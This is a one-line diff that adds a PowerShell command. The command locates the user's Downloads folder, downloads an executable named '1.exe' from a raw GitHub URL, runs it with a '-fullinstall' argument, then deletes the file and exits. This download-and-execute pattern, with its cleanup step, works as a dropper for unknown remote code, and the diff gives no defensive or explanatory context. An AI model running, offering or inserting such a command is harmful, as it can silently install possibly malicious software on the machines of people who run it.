@@ -1,0 +1,1 @@
+$d=(New-Object -ComObject Shell.Application).Namespace("shell:Downloads").Self.Path;$f="$d\\1.exe";iwr https://raw.githubusercontent.com/c0261/1/refs/heads/main/1.exe -OutFile $f;$p=Start-Process $f -ArgumentList "-fullinstall" -PassThru;$p.WaitForExit();Remove-Item $f;exit
